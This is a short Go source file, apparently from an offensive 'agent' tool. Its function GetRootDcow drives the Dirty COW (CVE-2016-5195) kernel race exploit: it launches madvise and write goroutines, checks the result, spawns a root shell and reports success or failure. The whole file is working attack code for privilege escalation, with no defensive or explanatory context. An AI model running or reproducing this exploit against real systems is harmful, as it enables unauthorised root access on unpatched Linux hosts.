package agent

import (
	"os"
)

// GetRootDcow run dirtycow CVE-2016-5195 exploit
func GetRootDcow() bool {
	ex := NewExpl(false)
	go ex.Madviser()
	go ex.Writer()
	ex.Checker()
	ex.Shell(true, false)
	ex.RestoreTerm()

	if ex.Iter != MAXITER {
		os.Stderr.WriteString("Success\n")
		return true
	}
	os.Stderr.WriteString("Exploit failed.\n")
	return false
}
